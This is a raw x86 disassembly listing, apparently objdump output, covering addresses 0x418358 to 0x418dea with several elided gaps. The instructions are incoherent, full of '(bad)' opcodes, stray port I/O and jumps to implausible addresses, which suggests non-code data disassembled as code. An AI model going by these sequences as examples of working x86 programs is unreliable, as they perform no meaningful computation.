  418358:	lds    eax,FWORD PTR ds:0xe6dd4b08
  41835e:	xchg   BYTE PTR [ebx+0x725ccc0c],cl
  418364:	cmp    BYTE PTR [eax+0x28],0x52
  418368:	sbb    al,0x86
  41836a:	or     al,0xef
  41836c:	push   ecx
  41836d:	mov    bh,0x42
  41836f:	dec    ecx
  418370:	pop    ebp
  418371:	and    ebp,DWORD PTR [eax-0x616d03df]
  418377:	cdq    
  418378:	push   0x7e
  41837a:	(bad)  
  41837b:	repnz push es
  41837d:	jp     0x418391
  41837f:	loopne 0x41839b
  418381:	sti    
  418382:	xor    edx,DWORD PTR [ebx+0x7d81cafb]
  418388:	mov    WORD PTR [eax+0x2d80dedd],fs
  41838e:	sbb    eax,0xc709
	...
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	les    ebx,FWORD PTR [eax+0xc2a1ed]
  418406:	add    DWORD PTR [eax],eax
  418408:	add    eax,0x63000001
  41840d:	int3   
  41840e:	sbb    DWORD PTR [ebp-0x6d],eax
  418411:	and    eax,0xea21dad1
  418416:	fimul  DWORD PTR [edx]
  418418:	adc    eax,0xb3164927
  41841d:	mov    al,ds:0x3c0a3ecf
  418422:	sub    BYTE PTR [edx+0x5c9a798e],al
  418428:	mov    ds:0x891164a5,eax
  41842d:	mov    ds:0xfb062265,eax
  418432:	adc    DWORD PTR [edx-0x15639661],ecx
  418438:	jmp    0x489bfe08
  41843d:	sbb    BYTE PTR [eax-0x68a5ad89],ch
  418443:	imul   ebp,DWORD PTR [edi+0x9],0x18
  418447:	dec    ebp
  418448:	adc    BYTE PTR [edi-0x3aae9723],ah
  41844e:	inc    esi
  41844f:	ret    0x622c
  418452:	daa    
  418453:	fldcw  WORD PTR [edi-0x526f8ad9]
  418459:	and    BYTE PTR [esi*1+0x26c431da],0x43
  418461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418462:	mov    edi,0x4ad9ec16
  418467:	daa    
  418468:	xchg   ebx,eax
  418469:	jnp    0x418490
  41846b:	lea    edx,[esi]
  41846d:	inc    ebx
  41846e:	leave  
  41846f:	and    bl,BYTE PTR [esi]
  418471:	fisubr WORD PTR [edx+0x79]
  418474:	stos   BYTE PTR es:[edi],al
  418475:	push   ebx
  418476:	pop    esp
  418477:	fwait
  418478:	test   al,0x5a
  41847a:	cmp    al,0x53
  41847c:	xchg   esi,eax
  41847d:	and    DWORD PTR ds:0x22eaec3e,esi
  418483:	mov    ecx,0x38745640
  418488:	sbb    eax,0xf3d3f286
  41848d:	fs cmp bh,bl
  418490:	jp     0x418498
  418492:	sbb    ch,ah
  418494:	and    ebx,DWORD PTR [edx]
  418496:	int    0x2e
  418498:	mov    ebp,0x2e9275cd
  41849d:	(bad)  
  41849e:	cli    
  41849f:	fild   QWORD PTR [edi-0x6f]
  4184a2:	and    BYTE PTR [ecx+0x30f92513],ah
  4184a8:	inc    edx
  4184a9:	out    dx,eax
  4184aa:	pop    ds
  4184ab:	or     eax,0xb4e83c00
  4184b0:	cmc    
  4184b1:	and    eax,0xaa23b845
  4184b6:	mov    esp,0x2838a017
  4184bb:	lods   eax,DWORD PTR ds:[esi]
  4184bc:	mov    ebp,0xf1f9b8c7
  4184c1:	push   esp
  4184c2:	ins    DWORD PTR es:[edi],dx
  4184c3:	neg    DWORD PTR [edi-0x3d]
  4184c6:	cwde   
  4184c7:	or     eax,0x6ebbd0fe
  4184cc:	add    al,0x2b
  4184ce:	out    0x87,al
  4184d0:	test   edx,edi
  4184d2:	or     ebx,0x61
  4184d5:	cmp    eax,0x54387893
  4184db:	jb     0x418537
  4184dd:	in     eax,0xca
  4184df:	fwait
  4184e0:	push   ecx
  4184e1:	jle    0x4184ce
  4184e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e4:	jp     0x4184e0
  4184e6:	xor    al,0x81
  4184e8:	call   0x27c99d62
  4184ed:	fldcw  WORD PTR [esi]
  4184ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184f0:	inc    ecx
  4184f1:	aad    0xb4
  4184f3:	mov    ss,WORD PTR [esi]
  4184f5:	cs sti 
  4184f7:	sti    
  4184f8:	pop    ds
  4184f9:	add    BYTE PTR [eax+0x14],ah
  4184fc:	inc    ebx
  4184fd:	adc    esp,edx
  4184ff:	pop    esi
  418500:	add    ecx,DWORD PTR [edx-0x40]
  418503:	addr16 jg 0x418572
  418506:	sbb    al,0x1e
  418508:	and    ebp,DWORD PTR [eax+edi*8+0x6d]
  41850c:	sar    ebp,cl
  41850e:	dec    ebp
  41850f:	push   eax
  418510:	js     0x418512
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	je     0x418574
  418582:	not    esp
  418584:	mov    DWORD PTR [ecx],0x1050001
  41858a:	add    BYTE PTR [eax],al
  41858c:	adc    ecx,edi
  41858e:	test   eax,0xd9bb63f4
  418593:	iret   
  418594:	jns    0x4185e8
  418596:	mov    bh,0x2d
  418598:	mov    ebx,0xb8d7a480
  41859d:	in     al,0x4f
  41859f:	sbb    ecx,edi
  4185a1:	out    0xa6,al
  4185a3:	jle    0x4185cf
  4185a5:	pushf  
  4185a6:	add    edi,eax
  4185a8:	sub    eax,0x823f5aa2
  4185ad:	xor    ebx,ebx
  4185af:	cmp    BYTE PTR [ebx-0x1ad1e757],cl
  4185b5:	pushf  
  4185b6:	in     eax,dx
  4185b7:	cmc    
  4185b8:	mov    ebp,0x2d0a13b9
  4185bd:	cmc    
  4185be:	lea    ebx,[ebx*8-0x53b1cdbc]
  4185c5:	std    
  4185c6:	pop    ebx
  4185c7:	in     eax,dx
  4185c8:	adc    ebp,DWORD PTR [edi+0x74c34003]
  4185ce:	mov    eax,ds:0x532cced8
  4185d3:	iret   
  4185d4:	cmc    
  4185d5:	out    dx,al
  4185d6:	xor    BYTE PTR [esi+0x30],cl
  4185d9:	adc    cl,ah
  4185db:	aas    
  4185dc:	rcl    bh,1
  4185de:	(bad)  
  4185e0:	jbe    0x418596
  4185e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185e3:	pop    ecx
  4185e4:	adc    al,0x38
  4185e6:	es adc esp,ecx
  4185e9:	retf   0xe021
  4185ec:	add    edx,0xffffffb0
  4185ef:	shl    DWORD PTR [ecx-0x71],cl
  4185f2:	jbe    0x4185c0
  4185f4:	pop    edx
  4185f5:	jl     0x41860e
  4185f7:	icebp  
  4185f8:	out    0x70,eax
  4185fa:	dec    ebx
  4185fb:	aas    
  4185fc:	pusha  
  4185fd:	sub    esp,DWORD PTR [esi+0x680f45c3]
  418603:	aas    
  418604:	in     al,0xae
  418606:	mov    WORD PTR [esi-0x4a],es
  418609:	sub    al,0xfd
  41860b:	fwait
  41860c:	xor    eax,0x7306f4fc
  418611:	ret    0xf81a
  418614:	pop    ebp
  418615:	in     eax,dx
  418616:	imul   BYTE PTR [ebx-0x21]
  418619:	mov    ebp,0xdf0be19
  41861e:	fild   QWORD PTR [eax+0x38e59090]
  418624:	cmp    eax,0x8421499d
  418629:	imul   ecx,edx,0xe8ab9978
  41862f:	mov    edi,DWORD PTR [eax+edx*4]
  418632:	push   ebp
  418633:	and    bh,ah
  418635:	sbb    eax,0xcf884fae
  41863a:	in     al,0xe0
  41863c:	jae    0x418606
  41863e:	lea    ecx,[edi]
  418640:	jle    0x4185fa
  418642:	in     eax,0xd6
  418644:	test   eax,0x39934de4
  418649:	and    BYTE PTR [edx],bh
  41864b:	into   
  41864c:	test   eax,0x1baae6c2
  418651:	dec    ecx
  418652:	in     eax,0xd4
  418654:	rcr    esp,1
  418656:	push   ebp
  418657:	pop    ebx
  418658:	imul   esp,DWORD PTR [esp+eax*4],0x36c8df18
  41865f:	pop    ebx
  418660:	jne    0x4186bb
  418662:	sbb    edx,edx
  418664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418665:	cwde   
  418666:	xor    BYTE PTR [ebx+ebp*4-0x74dcd3c7],dh
  41866d:	push   es
  41866e:	xchg   ecx,eax
  41866f:	xchg   DWORD PTR [eax],esi
  418671:	shl    BYTE PTR [ebx+ebp*4+0x38e38668],1
  418678:	pusha  
  418679:	sahf   
  41867a:	sub    ebx,DWORD PTR [eax]
  41867c:	push   ss
  41867d:	fild   WORD PTR [edi+ebx*8+0x66]
  418681:	pop    esp
  418682:	jmp    0xc84d6edc
  418687:	mov    bh,0xef
  418689:	xchg   bh,ah
  41868b:	mov    ds:0x73533f26,eax
  418690:	cmp    eax,DWORD PTR [eax]
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	push   ebp
  418701:	outs   dx,DWORD PTR ds:[esi]
  418702:	push   esi
  418703:	or     ah,cl
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0x12000001,al
  41870d:	adc    esi,ebp
  41870f:	xchg   edx,eax
  418710:	sar    BYTE PTR [ebp-0x2640c130],0xaf
  418717:	add    eax,0xd8d1a92
  41871c:	test   eax,0xbefffac7
  418721:	sbb    ebx,DWORD PTR [esi+0x4b14474f]
  418727:	inc    edi
  418728:	push   es
  418729:	cdq    
  41872a:	push   di
  41872c:	xchg   esi,eax
  41872d:	rcl    ah,cl
  41872f:	outs   dx,BYTE PTR ds:[esi]
  418730:	mov    es,WORD PTR [ecx-0xd654c4]
  418736:	scas   al,BYTE PTR es:[edi]
  418737:	sub    bh,BYTE PTR [esi+0x55]
  41873a:	xchg   DWORD PTR ds:[esi],esi
  41873d:	les    edx,FWORD PTR [edx+0x58ce6ad5]
  418743:	loopne 0x41877d
  418745:	fs jcxz 0x4186ea
  418749:	push   esi
  41874a:	pushf  
  41874b:	jg     0x418785
  41874d:	fsub   DWORD PTR [ebp-0x29]
  418750:	and    al,0xee
  418752:	cmp    eax,DWORD PTR [edx-0x9141dbb]
  418758:	push   0xfa5540a0
  41875d:	ret    0xe4d6
  418760:	mov    bh,0x34
  418762:	dec    esi
  418763:	aam    0x76
  418765:	and    al,0x44
  418767:	adc    DWORD PTR cs:[ecx],eax
  41876a:	enter  0xb7a,0xa0
  41876e:	fisttp QWORD PTR [ebx+edx*4+0x3ff2691f]
  418776:	loop   0x418744
  418778:	xchg   ecx,eax
  418779:	ret    
  41877a:	aas    
  41877b:	sub    dh,BYTE PTR [edi-0x623dee5d]
  418781:	repnz mov edi,DWORD PTR [eax+0x71ff48d1]
  418788:	push   ds
  418789:	ins    BYTE PTR es:[edi],dx
  41878a:	mov    bl,0xf4
  41878c:	push   0xe3fef93e
  418791:	fadd   st,st(3)
  418793:	(bad)  [edx-0x35]
  418796:	les    edx,FWORD PTR [eax-0x16]
  418799:	push   edx
  41879a:	mov    dh,BYTE PTR [edi]
  41879c:	mov    dh,0x5d
  41879e:	push   eax
  41879f:	adc    al,0xe8
  4187a1:	jns    0x4187a0
  4187a3:	or     esp,DWORD PTR [ebp+0x39115049]
  4187a9:	adc    DWORD PTR [ebx+0x4f],ecx
  4187ac:	sub    DWORD PTR ds:0x9082ef0a,edi
  4187b2:	outs   dx,BYTE PTR ds:[esi]
  4187b3:	fld    DWORD PTR [ecx-0x5f3e018d]
  4187b9:	(bad)  
  4187ba:	push   ebx
  4187bb:	scas   al,BYTE PTR es:[edi]
  4187bc:	mov    ds:0x4bd9b9f3,eax
  4187c1:	and    BYTE PTR [ebp-0x4d7b4e62],bl
  4187c7:	mov    ch,0xb9
  4187c9:	loope  0x4187e9
  4187cb:	cld    
  4187cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cd:	xchg   ebp,eax
  4187ce:	add    eax,0x85d6494c
  4187d3:	jg     0x418853
  4187d5:	and    DWORD PTR [eax+edi*8-0x37fdb13c],esi
  4187dc:	sub    cl,dl
  4187de:	enter  0x91ad,0xe
  4187e2:	xchg   esp,eax
  4187e3:	xchg   esp,eax
  4187e4:	pop    es
  4187e5:	lds    ebp,FWORD PTR [esi+ebp*1-0x20]
  4187e9:	imul   esp,DWORD PTR [esi+0x2d8b1549],0xfffffff2
  4187f0:	ss daa 
  4187f2:	bound  esi,QWORD PTR [ecx+0x79]
  4187f5:	and    eax,0xceedb17e
  4187fa:	jmp    DWORD PTR [edi+0xd8a9d0d]
  418800:	xchg   edi,eax
  418801:	test   BYTE PTR [eax+0x13],bh
  418804:	ss call 0x76c938ae
  41880a:	stos   DWORD PTR es:[edi],eax
  41880b:	cld    
  41880c:	sbb    bh,bh
  41880e:	ror    ch,1
  418810:	and    al,0x0
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x259c3acd]
  418881:	cs cmp eax,0x103d119
  418887:	add    BYTE PTR ds:0x63000001,al
  41888d:	xor    eax,0xc08d8f29
  418892:	iretw  
  418894:	or     al,0x34
  418896:	cmp    eax,0x8b7acc5f
  41889b:	lods   al,BYTE PTR ds:[esi]
  41889c:	jge    0x418885
  41889e:	or     eax,0xb4aa8977
  4188a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a4:	cmp    esp,DWORD PTR [ebx+0x21]
  4188a7:	int    0x2c
  4188a9:	cs cmp al,0x20
  4188ac:	aam    0xb3
  4188ae:	add    DWORD PTR [edx+ebx*2+0x2b],0x40811cf0
  4188b6:	mov    eax,0x9d80f0d2
  4188bb:	pop    esp
  4188bc:	xchg   esi,eax
  4188bd:	sub    eax,ebx
  4188bf:	ja     0x41885d
  4188c1:	add    al,dl
  4188c3:	sbb    dl,bl
  4188c5:	bound  ebx,QWORD PTR [ecx+0x2fe45b1b]
  4188cb:	sti    
  4188cc:	xor    eax,0x4d3d9817
  4188d1:	push   ebp
  4188d2:	push   ds
  4188d3:	repnz or eax,DWORD PTR [eax-0x7bb9a9ae]
  4188da:	pop    ss
  4188db:	sub    BYTE PTR [edx-0x6c6926f6],al
  4188e1:	icebp  
  4188e2:	pop    ebp
  4188e3:	sbb    dl,BYTE PTR [edi]
  4188e5:	fadd   DWORD PTR [edi]
  4188e7:	xor    eax,0x6053fa53
  4188ec:	inc    edx
  4188ed:	dec    ecx
  4188ee:	mov    ds:0xc4bb10a1,eax
  4188f3:	cmp    ch,BYTE PTR [esi]
  4188f5:	aaa    
  4188f6:	mov    edx,0x3ff33651
  4188fb:	pop    ss
  4188fc:	xchg   esi,eax
  4188fd:	lods   eax,DWORD PTR ds:[esi]
  4188fe:	mov    dh,0xc2
  418900:	cmp    ch,al
  418902:	push   edx
  418903:	xor    eax,0xd52d7b9b
  418908:	std    
  418909:	mov    bh,0xcd
  41890b:	xor    eax,0xaa4c394f
  418910:	mov    ecx,0xd48eaade
  418915:	add    edi,DWORD PTR [ecx-0x11d7fd44]
  41891b:	shl    BYTE PTR [ecx],0xf9
  41891e:	xchg   ecx,eax
  41891f:	js     0x4188bd
  418921:	in     al,0xcc
  418923:	jne    0x41893d
  418925:	clc    
  418926:	push   edi
  418927:	push   es
  418928:	inc    edx
  418929:	jmp    0x418984
  41892b:	aam    0x93
  41892d:	bound  edx,QWORD PTR [edx+0x5c]
  418930:	stos   BYTE PTR es:[edi],al
  418931:	add    ecx,esi
  418933:	imul   edi,ebx,0x69
  418936:	fwait
  418937:	sub    eax,0x9c29db92
  41893c:	enter  0x23b9,0xd5
  418940:	retf   0x2604
  418943:	cmp    bh,dh
  418945:	sub    DWORD PTR [eax-0x6b],0x5ac245be
  41894c:	adc    al,0x2d
  41894e:	push   edi
  41894f:	push   edx
  418950:	cli    
  418951:	fnstenv [edi]
  418953:	jnp    0x418949
  418955:	xchg   BYTE PTR [ecx],al
  418957:	mov    ch,0x63
  418959:	rcr    BYTE PTR [esi],0x9f
  41895c:	add    BYTE PTR [edi-0x3a23f150],0x4
  418963:	sub    ecx,ebx
  418965:	mov    ebx,DWORD PTR [edi+0x52]
  418968:	cmp    dh,0xa7
  41896b:	jle    0x4189e7
  41896d:	mov    ?,esi
  41896f:	ficomp DWORD PTR [ebx-0x6f48c5ae]
  418975:	(bad)  
  418976:	push   cs
  418977:	popa   
  418978:	outs   dx,DWORD PTR ds:[esi]
  418979:	imul   esp,DWORD PTR [ebp-0x52],0x64ea8fc8
  418980:	mov    gs,WORD PTR [bp+di-0x4713]
  418985:	or     ebp,DWORD PTR [edx]
  418987:	bound  eax,QWORD PTR [ecx-0x57]
  41898a:	mov    edi,DWORD PTR [esi+0x37]
  41898d:	dec    ebx
  41898e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41898f:	pop    edi
  418990:	pop    esi
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xdc1ce569
  418a03:	call   0x105:0x104d6
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	inc    edx
  418a0d:	stos   BYTE PTR es:[edi],al
  418a0e:	mov    eax,ds:0xfcb8d95d
  418a13:	or     edi,ebp
  418a15:	mov    ebp,0x514d5cb3
  418a1a:	pusha  
  418a1b:	push   edx
  418a1c:	mov    ah,0xa1
  418a1e:	leave  
  418a1f:	jl     0x4189ec
  418a21:	push   ebx
  418a22:	(bad)
  418a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a26:	xchg   ebx,eax
  418a27:	scas   eax,DWORD PTR es:[edi]
  418a28:	push   ss
  418a29:	arpl   WORD PTR [edi+0x713228d2],dx
  418a2f:	cmp    BYTE PTR [ebp-0x9],bl
  418a32:	adc    eax,0x8accbe7a
  418a37:	int    0xb8
  418a39:	cdq    
  418a3a:	mov    edx,0x1976f1e9
  418a3f:	add    eax,0xa077d121
  418a44:	inc    esi
  418a45:	fist   WORD PTR ds:0xa253e6cf
  418a4b:	sub    edi,edx
  418a4d:	(bad)  
  418a4e:	sti    
  418a4f:	adc    dh,BYTE PTR [edx+0x7a]
  418a52:	inc    esp
  418a53:	shl    DWORD PTR [esi+0x40154ea0],cl
  418a59:	jb     0x418a59
  418a5b:	dec    esi
  418a5c:	push   ebx
  418a5d:	ret    
  418a5e:	retf   
  418a5f:	mov    ds,ebx
  418a61:	add    BYTE PTR [edx+ebp*8-0x40],bh
  418a65:	pop    ss
  418a66:	cli    
  418a67:	retf   
  418a68:	add    al,0xf0
  418a6a:	sub    cl,dl
  418a6c:	xor    eax,0x921dde5f
  418a71:	sub    eax,0x53b91602
  418a76:	push   ebx
  418a77:	pop    ebp
  418a78:	loopne 0x418a0a
  418a7a:	xor    ebx,DWORD PTR [ecx-0x77478efe]
  418a80:	or     eax,0xda9d4364
  418a85:	das    
  418a86:	push   ss
  418a87:	daa    
  418a88:	dec    ecx
  418a89:	dec    ebp
  418a8a:	inc    edx
  418a8b:	stos   DWORD PTR es:[edi],eax
  418a8c:	pop    ecx
  418a8d:	sub    DWORD PTR ds:[edx-0x3777826b],ecx
  418a94:	fldcw  WORD PTR ds:[esi-0x48068a40]
  418a9b:	scas   al,BYTE PTR es:[edi]
  418a9c:	add    esi,DWORD PTR [ecx-0x62]
  418a9f:	xchg   esp,eax
  418aa0:	nop
  418aa1:	cdq    
  418aa2:	add    DWORD PTR ds:0x3ba51952,ecx
  418aa8:	adc    al,0x2a
  418aaa:	mov    es,WORD PTR [edi]
  418aac:	ret    
  418aad:	mov    dh,0x35
  418aaf:	lods   eax,DWORD PTR ds:[esi]
  418ab0:	bound  esp,QWORD PTR [ebp+edx*8+0x3227fb29]
  418ab7:	mov    ds:0x6048e777,eax
  418abc:	sti    
  418abd:	pushf  
  418abe:	scas   eax,DWORD PTR es:[edi]
  418abf:	push   ss
  418ac0:	lea    esp,[ebp-0x6037f8c3]
  418ac6:	fisub  DWORD PTR [edx]
  418ac8:	es xor ah,ch
  418acb:	sub    ebx,ebp
  418acd:	push   ecx
  418ace:	jae    0x418ae3
  418ad0:	inc    edi
  418ad1:	add    DWORD PTR [edx-0x4408a06c],0x68d17cd8
  418adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418adc:	cmp    eax,0x5c52ad2c
  418ae1:	pop    esi
  418ae2:	add    DWORD PTR [edi+0x4668a090],eax
  418ae8:	lea    ebx,fs:[edx+0x6e6f236a]
  418aef:	push   ds
  418af0:	not    BYTE PTR [ebp-0x158162f0]
  418af6:	lea    ebp,[eax+edx*8-0x4dc0164a]
  418afd:	ret    
  418afe:	adc    al,al
  418b00:	sub    bh,BYTE PTR [ebx+eax*1+0x12]
  418b04:	mov    ds:0x8ff02a59,eax
  418b09:	and    bh,BYTE PTR [eax-0x65713fde]
  418b0f:	inc    edx
  418b10:	sub    DWORD PTR [eax],eax
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xd1
  418b81:	inc    eax
  418b82:	out    dx,al
  418b83:	in     eax,dx
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	das    
  418b8d:	mov    ds:0x9dc6e453,eax
  418b92:	add    BYTE PTR [ecx],ah
  418b94:	lods   eax,DWORD PTR ds:[esi]
  418b95:	sub    ch,dl
  418b97:	out    0x75,al
  418b99:	fbstp  TBYTE PTR [ecx+0x7b]
  418b9c:	fisub  WORD PTR [esi+0x5]
  418b9f:	dec    ecx
  418ba0:	jbe    0x418c0e
  418ba2:	mov    dh,0x63
  418ba4:	test   ebx,ebx
  418ba6:	cmc    
  418ba7:	mov    dh,0x85
  418ba9:	mov    gs,esi
  418bab:	cmc    
  418bac:	or     ch,BYTE PTR [esi+0x4c]
  418baf:	mov    BYTE PTR [ebp+edi*4+0x24],dl
  418bb3:	push   esp
  418bb4:	(bad)
  418bb8:	and    BYTE PTR [ebx-0x3ae73dd6],0xb4
  418bbf:	(bad)  
  418bc0:	ficomp DWORD PTR [esi+eiz*8]
  418bc3:	mov    esi,0xae13c541
  418bc8:	sub    esp,DWORD PTR [ebx+0x52]
  418bcb:	ficom  WORD PTR [ebx-0x2e34de05]
  418bd1:	sub    DWORD PTR [esi],esp
  418bd3:	inc    edi
  418bd4:	or     DWORD PTR [edi+0x5eb21c63],esp
  418bda:	push   ecx
  418bdb:	mov    gs,WORD PTR [esi]
  418bdd:	or     al,0xfb
  418bdf:	out    dx,al
  418be0:	xchg   dh,bl
  418be2:	xchg   edi,eax
  418be3:	mov    BYTE PTR [edx+eax*2+0x10],ah
  418be7:	into   
  418be8:	fdivr  QWORD PTR [edi+0x17]
  418beb:	(bad)  [edx]
  418bed:	out    dx,al
  418bee:	lock inc esi
  418bf0:	sub    eax,0x7b86e845
  418bf5:	jns    0x418bfd
  418bf7:	mov    al,ds:0x24b13c4a
  418bfc:	pop    ebp
  418bfd:	mov    edi,0x16989c60
  418c02:	test   BYTE PTR [esi],bl
  418c04:	(bad)  
  418c05:	es pop ecx
  418c07:	sahf   
  418c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c09:	cli    
  418c0a:	mov    bh,0x14
  418c0c:	pushf  
  418c0d:	sub    DWORD PTR [ecx],ecx
  418c0f:	xor    eax,0x9923b63a
  418c14:	test   eax,0x8a085b46
  418c19:	sbb    eax,0x7ae1bd01
  418c1e:	cmp    eax,0x9dc30108
  418c23:	mov    eax,0xc18d76a0
  418c28:	pop    ebp
  418c29:	les    ecx,FWORD PTR [eax-0x50d17331]
  418c2f:	cs add al,0x11
  418c32:	leave  
  418c33:	jp     0x418bf9
  418c35:	pop    ss
  418c36:	adc    ebx,DWORD PTR [edx]
  418c38:	ds int3 
  418c3a:	repz add al,0x68
  418c3d:	cmp    BYTE PTR [esi],bl
  418c3f:	add    cl,BYTE PTR [ebp-0x184d6b9f]
  418c45:	aam    0xb2
  418c47:	lock mov ds:0x4e9d6364,eax
  418c4d:	or     ah,al
  418c4f:	jne    0x418c44
  418c51:	in     eax,dx
  418c52:	test   eax,0x73a5b585
  418c57:	inc    ebx
  418c58:	rcr    dh,0xcc
  418c5b:	das    
  418c5c:	add    esp,DWORD PTR [esi-0xf]
  418c5f:	add    edx,esp
  418c61:	in     eax,0x7f
  418c63:	mov    dl,0x9d
  418c65:	push   ebx
  418c66:	xchg   ebp,eax
  418c67:	std    
  418c68:	js     0x418cbd
  418c6a:	xchg   ebx,eax
  418c6b:	xchg   edi,eax
  418c6c:	int    0xc
  418c6e:	mov    esi,0xb29e023c
  418c73:	(bad)  
  418c74:	jae    0x418cd2
  418c76:	jl     0x418cf3
  418c78:	and    edx,ebp
  418c7a:	stos   BYTE PTR es:[edi],al
  418c7b:	nop
  418c7c:	push   ebp
  418c7d:	xchg   DWORD PTR [ebx+0x3c9c664d],ebx
  418c83:	retf   0x3e3f
  418c86:	jmp    0x418c2c
  418c88:	sub    ah,al
  418c8a:	lods   eax,DWORD PTR ds:[esi]
  418c8b:	mov    edi,0x19983d8d
  418c90:	iret   
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shr    BYTE PTR [edi+ebx*8+0x6e0dfef],cl
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0xa4000001
  418d0d:	and    al,0xe7
  418d0f:	or     DWORD PTR [eax+0x45],esp
  418d12:	inc    eax
  418d13:	sbb    cl,BYTE PTR [eax+0x64a76975]
  418d19:	dec    edx
  418d1a:	adc    BYTE PTR [ecx],bl
  418d1c:	lds    ebx,FWORD PTR [esi+ebx*2]
  418d1f:	and    ah,BYTE PTR [ebx+0x2c]
  418d22:	aaa    
  418d23:	loop   0x418cf2
  418d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d26:	scas   al,BYTE PTR es:[edi]
  418d27:	(bad)  
  418d28:	out    0x67,al
  418d2a:	imul   ecx,DWORD PTR [eax],0xffffffd2
  418d2d:	mov    esi,0xcf13636a
  418d32:	mov    DWORD PTR gs:[ecx],ecx
  418d35:	or     dl,BYTE PTR [ebp+0x229dbfcd]
  418d3b:	push   cs
  418d3c:	jmp    0x418d6f
  418d3e:	add    ebx,esp
  418d40:	lods   eax,DWORD PTR ds:[esi]
  418d41:	add    cl,0xfa
  418d44:	adc    ebp,ecx
  418d46:	fstp   DWORD PTR [esi+eiz*8]
  418d49:	bound  ebx,QWORD PTR [ebx+edi*4-0x57]
  418d4d:	sub    ah,BYTE PTR [eax-0x47fc15f0]
  418d53:	adc    ebx,DWORD PTR [ebx]
  418d55:	mov    al,0xa7
  418d57:	sub    ecx,DWORD PTR [ecx+eax*2+0x4b92596]
  418d5e:	retf   0x2626
  418d61:	pop    ecx
  418d62:	stos   DWORD PTR es:[edi],eax
  418d63:	in     eax,dx
  418d64:	jle    0x418d27
  418d66:	xchg   edx,eax
  418d67:	icebp  
  418d68:	lea    esi,[edx]
  418d6a:	out    dx,eax
  418d6b:	xor    eax,0xc93440c8
  418d70:	shr    BYTE PTR [eax+eax*1+0x1a],0xdf
  418d75:	push   ebx
  418d76:	je     0x418d33
  418d78:	ror    BYTE PTR [ecx-0x20],cl
  418d7b:	arpl   WORD PTR [ebx],cx
  418d7d:	mov    WORD PTR [ebx-0x63c59d5b],fs
  418d83:	test   BYTE PTR [eax],0xa
  418d86:	cdq    
  418d87:	jle    0x418dcf
  418d89:	xchg   DWORD PTR [eax+0x642f173b],ecx
  418d8f:	ret    
  418d90:	stc    
  418d91:	sub    DWORD PTR [ebx],edi
  418d93:	jmp    0x418d60
  418d95:	sub    al,ch
  418d97:	xor    DWORD PTR gs:[edi+0x6f],0x72e2d3e8
  418d9f:	dec    ebp
  418da0:	popa   
  418da1:	cdq    
  418da2:	sbb    eax,0x4c43d11a
  418da7:	jae    0x418da8
  418da9:	mov    WORD PTR ds:0x84717a22,ds
  418daf:	jmp    0x7c61:0x3efea832
  418db6:	(bad)  
  418db8:	and    cl,ch
  418dba:	outs   dx,DWORD PTR ds:[esi]
  418dbb:	mov    bl,0x41
  418dbd:	mov    dl,0x86
  418dbf:	pop    edx
  418dc0:	inc    edi
  418dc1:	add    esp,edx
  418dc3:	(bad)  
  418dc4:	cmp    edx,ebx
  418dc6:	mov    cl,0xfc
  418dc8:	daa    
  418dc9:	stos   DWORD PTR es:[edi],eax
  418dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dcb:	dec    esi
  418dcc:	dec    eax
  418dcd:	aam    0xd2
  418dcf:	jge    0x418e27
  418dd1:	ficomp WORD PTR [edx+ecx*1]
  418dd4:	cwde   
  418dd5:	jle    0x418d86
  418dd7:	xchg   edi,eax
  418dd8:	cmp    al,0x49
  418dda:	and    BYTE PTR [edx-0x24],bl
  418ddd:	jl     0x418e10
  418ddf:	xchg   esp,eax
  418de0:	and    edi,DWORD PTR [edi-0x68]
  418de3:	mov    bl,0x82
  418de5:	aad    0x8b
  418de7:	pop    esi
  418de8:	pop    esp
  418de9:	push   ds
  418dea:	shr    DWORD PTR [ecx-0x67],1
